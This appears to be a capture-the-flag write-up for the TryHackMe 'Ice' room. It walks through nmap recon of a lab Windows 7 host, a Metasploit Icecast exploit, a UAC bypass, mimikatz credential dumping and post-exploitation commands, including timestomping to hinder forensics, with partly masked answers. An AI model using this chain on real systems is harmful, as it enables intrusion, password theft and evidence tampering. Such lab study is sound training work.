# Ice

[Link to room](https://tryhackme.com/room/ice)

echo machine-ip ice.com >> /etc/hosts

## Recon
nmap -sC -sV -oN nmap_ice ice.com

```nmap
Nmap 7.80 scan initiated Wed Jun 17 08:47:27 2020 as: nmap -sC -sV -oN nmap.txt ice.com
Nmap scan report for ice.com (10.10.18.254)
Host is up (0.21s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:20:c4:25:26:e0 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-17T07:48:40-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-17T12:48:40
|_  start_date: 2020-06-17T12:45:36

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 17 08:49:53 2020 -- 1 IP address (1 host up) scanned in 146.39 seconds
```
1. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

> MSRDP default port is 3389

2. What service did nmap identify as running on port 8000?

> check nmap results

3. What does Nmap identify as the hostname of the machine?

> check nmap results 

## Gain Access

[link to CVE](https://www.cvedetails.com)

1. What type of vulnerability is it?

> visit link to get the answer

2. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

> visit link to get the answer

3. start metasploit and search icecast

> exploit/??????/http/?????_header

4. What is the only required setting which currently is blank?

> run show options

Exploit the machine

## Escalate

1. What's the name of the shell we have now?

> run the exploit to answer the question

2. hat user was running that Icecast process?

> run getuid to answer the question

3. What build of Windows is the system?

> run sysinfo to answer the question

4. run the following command `run post/multi/recon/local_exploit_suggester`

```
[*] 10.10.18.254 - Collecting local exploits for x86/windows...
[*] 10.10.18.254 - 30 exploit checks are being tried...
[+] 10.10.18.254 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.18.254 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.18.254 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.18.254 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
```

5. What is the full path (starting with exploit/) for the first returned exploit?

> exploit/windows/?????/bypassuac_???????

run bg to background our meterpreter session

```
use exploit/windows/local/bypassuac_eventvwr
set session SESSION_NUMBER
set LHOST to your tun0 ip
```

6. run getprivs in meterpreter shell
```
meterpreter > getprivs 

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

> SeTake????????Privilege

## Looting

```
run ps to see list of processes
migrate -N  spoolsv.exe
```
1. run getuid you see that we are system same as root in linux machines

> NT AUTHORITY/??????

2. run load kiwi to load mimikatz

> run help and you will a mimikatz help section

3. What is Dark's password?

> Pass??????1!

## Post Exploitation

1. What command allows us to dump all of the password hashes stored on the system?

> help (????dump)

2. what command allows us to watch the remote user's desktop in real time?

> help (screen?????)

3. How about if we wanted to record from a microphone attached to the system?

> help (record_???)

4. To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? 

> help (time?????)

5. Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What 
command allows us to do this?

> help (golden_ticket_??????)
